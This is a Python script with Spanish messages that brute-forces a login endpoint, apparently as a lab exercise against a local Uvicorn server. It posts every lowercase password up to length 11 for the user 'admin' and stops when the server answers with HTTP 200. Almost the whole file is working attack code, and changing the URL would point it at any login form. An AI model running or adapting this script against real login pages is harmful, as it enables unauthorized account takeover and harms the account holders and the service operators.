import requests
import json
import itertools
import time
import sys
from requests.exceptions import ConnectionError, Timeout


URL = "http://127.0.0.1:8000/login"
USERNAME = "admin" 
ALPHABET = "abcdefghijklmnopqrstuvwxyz" 
MAX_LENGTH = 11 
SLEEP_TIME = 0.001 
print(f"--- Iniciando Ataque de FUERZA BRUTA OPTIMIZADO contra {URL} ---")
print(f"Usuario objetivo: {USERNAME}")
print(f"Contraseña a buscar: 'abc' (Longitud {MAX_LENGTH})")
print(f"Intentos por segundo (estimado): ~{1 / SLEEP_TIME}")
print("-" * 50)

def run_optimized_brute_force_attack():
    session = requests.Session() 
    
    start_time = time.time()
    intentos = 0
    encontrado = False

    for length in range(1, MAX_LENGTH + 1):
        print(f"\n--- Probando contraseñas de longitud {length} ---")
        
        to_attempt = itertools.product(ALPHABET, repeat=length)
        
        for attempt_tuple in to_attempt:
            password = "".join(attempt_tuple)
            intentos += 1
            
            if intentos % 100 == 0 or intentos <= 10:
                 print(f"Intento {intentos:,}: {password}")

            
            payload = {
                "nombre_usuario": USERNAME,
                "contrasena": password
            }
            headers = {
                "Content-Type": "application/json"
            }
            
            try:
        
                time.sleep(SLEEP_TIME) 
                
                response = session.post(URL, headers=headers, data=json.dumps(payload), timeout=5)

            
                if response.status_code == 200:
                    encontrado = True
                    break 
                
                
                elif response.status_code != 401 and response.status_code != 422:
                    print(f" Error inesperado del servidor ({response.status_code}) para la contraseña: {password}.")

            except ConnectionError:
                print("\n ERROR DE CONEXIÓN: Asegúrate de que tu servidor Uvicorn esté corriendo.")
                sys.exit(1)
                
            except Timeout:
                print(f" TIEMPO DE ESPERA AGOTADO. El servidor no responde a tiempo. Saltando intento...")
                time.sleep(1) 
                
        if encontrado:
            break # Éxito

    tiempo_total = time.time() - start_time
    print("-" * 50)
    
    if encontrado:
        print(f" ÉXITO! Contraseña encontrada: {password}")
    else:
        print(" FALLO! La contraseña no se encontró dentro del límite establecido.")
        
    print(f"Intentos totales: {intentos:,}")
    print(f"Tiempo total: {tiempo_total:.4f} segundos")
    return 0

if __name__ == "__main__":
    run_optimized_brute_force_attack()
